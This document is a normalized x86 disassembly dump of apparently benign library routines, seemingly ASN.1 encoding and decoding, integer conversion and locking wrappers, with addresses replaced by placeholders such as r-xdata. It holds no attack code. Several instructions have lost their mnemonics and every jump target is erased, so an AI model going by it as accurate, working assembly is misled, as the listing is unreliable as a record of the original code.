pop ebx
add esp 0x58
retn
sub_1002e840
mov eax [ esp + 0x8 ]
test eax eax
jg r-xdata
cmp eax 0x2
jl r-xdata
mov eax 0x1
retn
xor eax eax
retn
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ eax + 0x1 ]
test dl dl
jne r-xdata
add eax 0x2
mov [ ecx ] eax
mov eax 0x1
retn
sub_1002e880
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x24 ]
mov eax [ eax ]
test esi esi
push edi
je r-xdata
push 0x96
push r--data
push 0x7b
push 0x72
push 0xd
call sub_1001de60
add esp 0x14
mov eax 0x80
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor ecx ecx
mov cl [ eax ]
mov ebx ecx
mov edi ecx
and ecx 0x1f
and ebx 0x20
and edi 0xc0
cmp ecx 0x1f
mov [ esp + 0x10 ] ebx
jne r-xdata
inc eax
dec esi
test esi esi
je r-xdata
inc eax
dec esi
test esi esi
je r-xdata
mov edx [ esp + 0x20 ]
lea ebp [ esi - 0x1 ]
mov [ edx ] ecx
mov ecx [ esp + 0x24 ]
mov [ ecx ] edi
xor ecx ecx
cmp esi 0x1
jl r-xdata
mov cl [ eax ]
xor edx edx
test cl 0x80
je r-xdata
mov dl [ eax ]
cmp dl 0x80
jne r-xdata
mov cl [ eax ]
and ecx 0x7f
shl edx 0x7
or ecx edx
inc eax
dec esi
je r-xdata
and ecx 0x7f
shl edx 0x7
or ecx edx
inc eax
dec esi
mov edx ecx
je r-xdata
mov bl dl
mov [ esp + 0x20 ] 0x0
and ebx 0x7f
lea esi [ eax + 0x1 ]
test dl 0x80
mov edi ebx
je r-xdata
mov edi 0x1
lea esi [ eax + 0x1 ]
jmp r-xdata
jmp r-xdata
cmp edx 0xffffff
jg r-xdata
mov ecx edi
cmp edi 0x4
ja r-xdata
mov eax [ esp + 0x1c ]
mov ebp [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ ebp ]
mov eax [ esp + 0x28 ]
sub edx esi
add edx eax
cmp ecx edx
jle r-xdata
mov cl [ eax ]
test cl 0x80
jne r-xdata
mov edi [ esp + 0x20 ]
mov ebx [ esp + 0x10 ]
mov edx ebp
dec ebp
test edx edx
je r-xdata
mov eax edi
mov [ ebp ] esi
pop edi
pop esi
or eax ebx
pop ebp
pop ebx
pop ecx
retn
push 0x8e
push r--data
push 0x9b
push 0x72
push 0xd
call sub_1001de60
add esp 0x14
or bl 0x80
mov eax edi
dec edi
test eax eax
jbe r-xdata
xor edx edx
mov eax ebp
mov dl [ esi ]
shl ecx 0x8
or ecx edx
inc esi
dec ebp
test eax eax
je r-xdata
mov edx edi
dec edi
test edx edx
ja r-xdata
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
sub_1002ea00
push ebx
mov edx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x10 ]
mov eax ebp
push esi
mov esi [ esp + 0x10 ]
push edi
neg eax
mov ecx [ esi ]
sbb eax eax
and edx 0xc0
and eax 0x20
or eax edx
mov edx [ esp + 0x20 ]
cmp edx 0x1f
jge r-xdata
or al 0x1f
mov esi edx
mov [ ecx ] al
inc ecx
xor eax eax
test edx edx
jle r-xdata
and dl 0x1f
or dl al
mov [ ecx ] dl
inc ecx
jmp r-xdata
mov esi eax
lea edi [ eax - 0x1 ]
mov [ esp + 0x18 ] esi
mov ebx eax
test eax eax
mov esi edi
jle r-xdata
sar esi 0x7
inc eax
test esi esi
jg r-xdata
cmp ebp 0x2
jne r-xdata
mov esi [ esp + 0x14 ]
add ecx ebx
mov al dl
and al 0x7f
cmp esi edi
mov [ esi + ecx ] al
je r-xdata
mov edx [ esp + 0x1c ]
cmp edx 0x7f
mov ebx edx
jg r-xdata
mov [ ecx ] 0x80
inc ecx
mov [ esi ] ecx
pop edi
pop esi
pop ebp
pop ebx
retn
sar edx 0x7
mov eax esi
dec esi
test eax eax
jg r-xdata
or al 0x80
mov [ esi + ecx ] al
xor eax eax
test edx edx
jle r-xdata
mov [ ecx ] dl
inc ecx
mov [ esi ] ecx
pop edi
pop esi
pop ebp
pop ebx
retn
mov dl al
mov edi eax
or dl 0x80
mov [ ecx ] dl
inc ecx
mov edx eax
dec eax
test edi edi
jle r-xdata
sar edx 0x8
inc eax
test edx edx
jg r-xdata
add ecx edx
pop edi
mov [ esi ] ecx
pop esi
pop ebp
pop ebx
retn
mov [ eax + ecx ] bl
mov edi eax
sar ebx 0x8
dec eax
test edi edi
jg r-xdata
sub_1002eb00
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
cmp ecx 0x1f
lea eax [ edx + 0x1 ]
jl r-xdata
cmp [ esp + 0x4 ] 0x2
jne r-xdata
test ecx ecx
jle r-xdata
inc eax
cmp edx 0x7f
jle r-xdata
add eax 0x3
retn
sar ecx 0x7
inc eax
test ecx ecx
jg r-xdata
retn
test edx edx
jle r-xdata
sar edx 0x8
inc eax
test edx edx
jg r-xdata
sub_1002eb40
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x10 ]
mov ecx [ ebx ]
push edi
push ecx
mov edi [ esi ]
lea edx [ esi + 0x14 ]
lea ebp [ esi + 0x10 ]
lea eax [ esi + 0x18 ]
push edx
push ebp
push eax
push esi
call sub_1002e880
add esp 0x14
mov [ esi + 0xc ] eax
test al 0x80
je r-xdata
cmp [ ebp ] 0x10
je r-xdata
mov [ esi + 0x8 ] 0x3c
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ esi ]
mov ecx [ ebx ]
sub edi edx
add ecx edi
mov [ ebx ] ecx
mov eax [ esi + 0x1c ]
test eax eax
mov ebx ecx
je r-xdata
mov [ esi + 0x8 ] 0x3d
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp [ esi + 0xc ] 0x21
jne r-xdata
test ebx ebx
jge r-xdata
mov [ esi + 0x4 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ esi + 0x24 ]
mov edx [ esi ]
mov ecx [ eax ]
sub ecx edx
add ecx ebx
mov [ esi + 0x18 ] ecx
mov [ esi + 0x8 ] 0x3e
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_1002ebe0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
jne r-xdata
mov ebx [ edi + 0x4 ]
push 0x19e
push r--data
push 0x10
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push eax
push ecx
push esi
call sub_1002ec90
add esp 0xc
test eax eax
jne r-xdata
push 0x1a1
push r--data
push 0x41
push 0x82
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0xc ]
mov eax esi
mov [ esi + 0xc ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
retn
push eax
call sub_1001d740
add esp 0x4
sub_1002ec90
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
push edi
test ebp ebp
jge r-xdata
mov ebx [ esp + 0x14 ]
cmp [ ebx ] ebp
jl r-xdata
test esi esi
jne r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
mov edi [ ebx + 0x8 ]
test edi edi
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x179
lea ecx [ ebp + 0x1 ]
push r--data
push ecx
push esi
call sub_1001d540
add esp 0x10
push 0x177
lea eax [ ebp + 0x1 ]
push r--data
push eax
call sub_1001d4c0
add esp 0xc
jmp r-xdata
test esi esi
mov [ ebx ] ebp
je r-xdata
mov esi [ esp + 0x18 ]
push 0x17d
push r--data
push 0x41
push 0xba
push 0xd
call sub_1001de60
add esp 0x14
mov [ ebx + 0x8 ] esi
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi eax
mov [ ebx + 0x8 ] eax
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x8 ]
mov [ eax + ebp ] 0x0
sub_1002ed60
push 0x19e
push r--data
push 0x10
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x4
mov [ eax + 0x8 ] 0x0
mov [ eax + 0xc ] 0x0
retn
push 0x1a1
push r--data
push 0x41
push 0x82
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1002edc0
push 0x19e
push r--data
push 0x10
call sub_1001d4c0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
mov edx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
push 0x1a1
push r--data
push 0x41
push 0x82
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1002ee10
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
sub_1002ee40
mov edx [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0xc ]
push esi
mov ecx [ edx ]
mov esi [ ebx ]
mov eax ecx
sub eax esi
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
push edi
mov edi [ ebx + 0x8 ]
xor eax eax
[ esi ] [ edi ]
pop edi
je r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov eax [ edx + 0x4 ]
mov ecx [ ebx + 0x4 ]
sub eax ecx
sub_1002f100
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
and esi 0x100
and edx 0x100
cmp esi edx
je r-xdata
push ecx
push eax
call sub_1002ee40
add esp 0x8
test esi esi
je r-xdata
mov eax esi
pop esi
neg eax
sbb eax eax
and al 0xfe
inc eax
retn
pop esi
retn
neg eax
sub_1002f140
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
xor ebp ebp
mov [ esp + 0xf ] 0x0
test esi esi
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov edx [ esi + 0x8 ]
test edx edx
je r-xdata
mov ebx [ esi + 0x4 ]
mov eax [ esi ]
and ebx 0x100
test eax eax
jne r-xdata
xor ecx ecx
mov [ esp + 0x14 ] eax
mov cl [ edx ]
test ebx ebx
jne r-xdata
mov edx 0x1
mov [ esp + 0x14 ] edx
jmp r-xdata
cmp ecx 0x80
jg r-xdata
cmp ecx 0x7f
jle r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov ebp 0x1
mov [ esp + 0xf ] 0xff
jne r-xdata
mov eax [ esp + 0x14 ]
add eax ebp
mov [ esp + 0x14 ] eax
mov edx eax
mov ebp 0x1
mov [ esp + 0xf ] bl
jmp r-xdata
push edi
mov edi [ eax ]
test ebp ebp
je r-xdata
pop esi
pop ebp
mov eax edx
pop ebx
pop ecx
retn
mov ecx 0x1
cmp eax ecx
jle r-xdata
mov ecx [ esi ]
test ecx ecx
jne r-xdata
mov cl [ esp + 0x13 ]
mov [ edi ] cl
inc edi
cmp [ edx + ecx ] 0x0
jne r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] cl
mov ecx [ eax ]
add ecx edx
pop edi
pop esi
mov [ eax ] ecx
pop ebp
mov eax edx
pop ebx
pop ecx
retn
inc ecx
cmp ecx eax
jl r-xdata
mov edx [ esi + 0x8 ]
lea esi [ edi + ecx - 0x1 ]
mov bl [ edx + ecx - 0x1 ]
lea edx [ edx + ecx - 0x1 ]
test bl bl
jne r-xdata
mov esi [ esi + 0x8 ]
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax ]
pop edi
add ecx edx
pop esi
mov [ eax ] ecx
pop ebp
mov eax edx
pop ebx
pop ecx
retn
jmp r-xdata
mov bl [ edx ]
not bl
inc bl
mov [ esi ] bl
dec esi
dec edx
dec ecx
test ecx ecx
jle r-xdata
mov [ esi ] 0x0
mov bl [ edx - 0x1 ]
dec esi
dec edx
dec ecx
test bl bl
je r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ eax ]
add ecx edx
pop edi
pop esi
mov [ eax ] ecx
pop ebp
mov eax edx
pop ebx
pop ecx
retn
mov bl [ edx ]
dec esi
not bl
mov [ esi + 0x1 ] bl
dec edx
dec ecx
jne r-xdata
sub_1002f290
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
push 0x2
call sub_1002edc0
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
mov ebp [ edi ]
test ebp ebp
jne r-xdata
mov [ ebp + 0x4 ] 0x2
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esp + 0x1c ]
mov ebx [ esp + 0x20 ]
push 0xc7
push r--data
mov esi [ eax ]
lea edx [ ebx + 0x1 ]
push edx
lea ecx [ esi + ebx ]
mov [ esp + 0x1c ] ecx
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x20 ] eax
test eax eax
jne r-xdata
test ebx ebx
jne r-xdata
push 0x103
push r--data
push 0x41
push 0xc2
push 0xd
call sub_1001de60
add esp 0x14
test ebp ebp
je r-xdata
test [ esi ] 0x80
je r-xdata
mov [ ebp + 0x4 ] 0x2
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
test edi edi
je r-xdata
mov [ ebp + 0x4 ] 0x2
mov cl [ esi ]
test cl cl
jne r-xdata
mov [ ebp + 0x4 ] 0x102
mov al [ esi ]
cmp al 0xff
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push ebp
call sub_1002ee10
add esp 0x4
cmp [ edi ] ebp
je r-xdata
mov ecx ebx
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp ebx 0x1
je r-xdata
mov ecx [ esp + 0x20 ]
mov dl [ esi + ebx - 0x1 ]
lea eax [ esi + ebx - 0x1 ]
mov edi ebx
test dl dl
lea esi [ ecx + ebx - 0x1 ]
jne r-xdata
cmp ebx 0x1
je r-xdata
mov ecx [ esp + 0x20 ]
mov [ ebp ] ebx
test edi edi
mov [ ebp + 0x8 ] ecx
je r-xdata
push eax
call sub_1001d740
add esp 0x4
inc esi
dec ebx
test edi edi
jne r-xdata
test edi edi
je r-xdata
inc esi
dec ebx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
mov eax ebp
pop ebp
pop ebx
pop ecx
retn
mov [ edi ] ebp
mov cl [ eax ]
not cl
inc cl
mov [ esi ] cl
dec esi
dec eax
dec edi
test edi edi
jle r-xdata
mov [ ecx ] 0x1
mov [ ecx + ebx ] 0x0
inc ebx
jmp r-xdata
mov [ esi ] 0x0
mov dl [ eax - 0x1 ]
dec esi
dec edi
dec eax
test dl dl
je r-xdata
mov edi [ esp + 0x18 ]
mov dl [ eax ]
dec esi
not dl
mov [ esi + 0x1 ] dl
dec eax
dec edi
jne r-xdata
jmp r-xdata
sub_1002f410
mov eax 0x8
call sub_1001d0d0
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi ]
mov [ esi + 0x4 ] 0x2
cmp eax 0x5
jge r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jge r-xdata
push 0x161
push r--data
push 0x41
push 0x76
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
add esp 0x8
retn
push 0x15c
push r--data
push 0x5
call sub_1001d4c0
add esp 0xc
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
xor eax eax
neg ecx
mov [ esi + 0x4 ] 0x102
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] cl
xor ecx ecx
dec eax
test eax eax
jl r-xdata
mov [ esp + eax + 0x4 ] cl
sar ecx 0x8
inc eax
cmp eax 0x4
jb r-xdata
mov [ esi ] ecx
mov eax 0x1
pop esi
add esp 0x8
retn
push ebx
test ecx ecx
je r-xdata
mov edx [ esi + 0x8 ]
mov bl [ esp + eax + 0x8 ]
mov [ edx + ecx ] bl
inc ecx
dec eax
jns r-xdata
pop ebx
sub_1002f4d0
mov ecx [ esp + 0x4 ]
push ebp
xor ebp ebp
xor eax eax
push esi
push edi
test ecx ecx
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp edx 0x102
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp edx 0x2
je r-xdata
mov ebp 0x1
mov esi [ ecx ]
cmp esi 0x4
jle r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
retn
mov edi [ ecx + 0x8 ]
test edi edi
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
retn
xor ecx ecx
test esi esi
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
test ebp ebp
je r-xdata
xor edx edx
mov dl [ edi + ecx ]
shl eax 0x8
or eax edx
inc ecx
cmp ecx esi
jl r-xdata
pop edi
pop esi
pop ebp
retn
neg eax
sub_1002f540
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi ebx
push 0x2
call sub_1002edc0
add esp 0x4
mov esi eax
jmp r-xdata
mov edi [ esp + 0x10 ]
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push 0x1a0
push r--data
push 0x3a
jmp r-xdata
test esi esi
jne r-xdata
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x4 ] 0x102
jmp r-xdata
push 0x8b
push 0xd
call sub_1001de60
add esp 0x14
cmp esi ebx
je r-xdata
mov ecx [ esi ]
add eax 0x4
cmp ecx eax
jge r-xdata
cdq
and edx 0x7
add eax edx
sar eax 0x3
inc eax
push edi
call sub_10029870
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push esi
call sub_1002ee10
add esp 0x4
mov ecx [ esi + 0x8 ]
push ecx
push edi
call sub_10029ef0
add esp 0x8
mov [ esi ] eax
test eax eax
jne r-xdata
push 0x1aa
push r--data
push eax
mov eax [ esi + 0x8 ]
push eax
call sub_1001d540
add esp 0x10
test eax eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
mov [ edx ] al
mov [ esi ] 0x1
mov [ esi + 0x8 ] eax
push 0x1ad
push r--data
push 0x41
sub_1002f620
mov eax [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0xc ]
push eax
mov ecx [ edi ]
mov edx [ edi + 0x8 ]
push ecx
push edx
call sub_10029d50
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
cmp [ edi + 0x4 ] 0x102
jne r-xdata
push 0x1c4
push r--data
push 0x69
push 0x77
push 0xd
call sub_1001de60
add esp 0x14
mov eax esi
pop edi
pop esi
retn
mov eax esi
pop edi
pop esi
retn
push 0x1
push esi
call sub_1002a190
add esp 0x8
sub_1002f680
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push ecx
push edx
push eax
call sub_10022730
push eax
call sub_1004f050
add esp 0x14
retn
sub_1002f6b0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push ecx
push edx
push eax
call sub_10035060
push eax
call sub_1004f050
add esp 0x14
retn
sub_1002f720
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_10022810
push eax
call sub_10050150
add esp 0x14
retn
sub_1002f750
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
push r--data
push sub_10035080
call sub_1004add0
add esp 0x18
retn
sub_1002f7a0
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x24 ]
test eax eax
je r-xdata
push 0x7e
push r--data
push 0x92
push 0xb9
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
retn
mov edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x8 ]
push 0x0
push edx
push ecx
call eax
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
retn
sub_1002f7f0
push esi
push 0x107
push r--data
push 0x1
push 0x9
xor esi esi
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov esi eax
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push 0x110
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax esi
pop esi
retn
push 0x10a
push r--data
push r--data
call sub_1001d780
push sub_10030070
push sub_10030030
call sub_1001fbd0
add esp 0x14
mov [ rw-data ] eax
call sub_1001d7b0
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_1002f870
push 0x117
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
push 0x11d
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
retn
push eax
call sub_1001fca0
add esp 0x4
mov [ rw-data ] 0x0
sub_1002f8c0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push esi
push 0x0
call [ eax ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0x12a
push r--data
push 0x1
push 0x5
call sub_1001f5b0
mov ecx [ esp + 0x18 ]
push ecx
push esi
call sub_1001ff80
push 0x12c
push r--data
push 0x1
push 0x6
mov esi eax
call sub_1001f5b0
add esp 0x28
mov eax esi
pop esi
retn
pop esi
retn
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
sub_1002f960
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push esi
push 0x1
call [ eax ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0x13b
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov ecx [ esp + 0x18 ]
push ecx
push esi
call sub_1001fcf0
push 0x13d
push r--data
push 0x1
push 0xa
mov esi eax
call sub_1001f5b0
add esp 0x28
mov eax esi
pop esi
retn
pop esi
retn
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
sub_1002fa00
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push esi
push 0x0
call [ eax ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0x14c
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov ecx [ esp + 0x18 ]
push ecx
push esi
call sub_1001fe60
push 0x14e
push r--data
push 0x1
push 0xa
mov esi eax
call sub_1001f5b0
add esp 0x28
mov eax esi
pop esi
retn
pop esi
retn
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
sub_1002faa0
push esi
push 0x157
push r--data
push 0x1
push 0x9
xor esi esi
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov esi eax
inc ecx
mov [ rw-data ] ecx
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push 0x163
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax esi
pop esi
retn
push 0x15a
push r--data
push r--data
call sub_1001d780
push sub_10030070
push sub_10030060
call sub_1001fbd0
add esp 0x14
mov [ rw-data ] eax
call sub_1001d7b0
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_1002fb30
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi ] 0x0
je r-xdata
push 0x16e
push r--data
push 0x1
push 0xffffffff
push rw-data
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov [ esi ] 0x0
sub_1002fb70
mov eax 0x4
call sub_1001d0d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push 0x0
call [ eax + 0x14 ]
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push esi
push 0x188
push r--data
push 0x1
push 0x5
call sub_1001f5b0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_1001ff80
push 0x18a
push r--data
push 0x1
push 0x6
mov esi eax
call sub_1001f5b0
mov ecx [ rw-data ]
lea eax [ esp + 0x2c ]
push eax
call [ ecx + 0x18 ]
add esp 0x2c
mov eax esi
pop esi
pop ecx
retn
pop ecx
retn
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
sub_1002fc30
mov eax 0x4
call sub_1001d0d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push 0x1
call [ eax + 0x14 ]
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push esi
push 0x19a
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_1001fcf0
push 0x19c
push r--data
push 0x1
push 0xa
mov esi eax
call sub_1001f5b0
mov ecx [ rw-data ]
lea eax [ esp + 0x2c ]
push eax
call [ ecx + 0x18 ]
add esp 0x2c
mov eax esi
pop esi
pop ecx
retn
pop ecx
retn
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
sub_1002fcf0
mov eax 0x4
call sub_1001d0d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push ebp
push 0x0
call [ eax + 0x14 ]
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
je r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
pop ebp
pop ecx
retn
push 0x1ac
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_1001fe60
mov ebp eax
mov eax [ rw-data ]
add esp 0x18
cmp eax 0x1
jne r-xdata
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
push 0x1b5
push r--data
push 0x1
push 0xa
call sub_1001f5b0
mov edx [ rw-data ]
lea ecx [ esp + 0x14 ]
push ecx
call [ edx + 0x18 ]
add esp 0x14
test ebp ebp
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push edi
lea esi [ ebp + 0x84 ]
mov edi 0x10
push eax
call sub_10020130
add esp 0x4
test eax eax
jne r-xdata
mov [ esi + 0x40 ] 0x0
add esi 0x4
dec edi
jne r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ rw-data ]
push eax
call sub_1001fca0
add esp 0x4
mov [ rw-data ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
push ebp
call sub_1001d740
add esp 0x4
pop edi
pop esi
push eax
call sub_1001d740
add esp 0x4
mov [ esi ] 0x0
sub_1002fe30
push esi
push 0x1c0
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
push 0x1c2
mov esi eax
push r--data
inc eax
push 0x1
push 0xa
mov [ rw-data ] eax
call sub_1001f5b0
add esp 0x20
mov eax esi
pop esi
retn
sub_1002fe70
mov eax 0x8
call sub_1001d0d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov edx [ rw-data ]
shr eax 0x18
lea ecx [ esp ]
shl eax 0x18
push ecx
mov [ esp + 0x4 ] eax
call [ edx + 0x8 ]
add esp 0x4
test eax eax
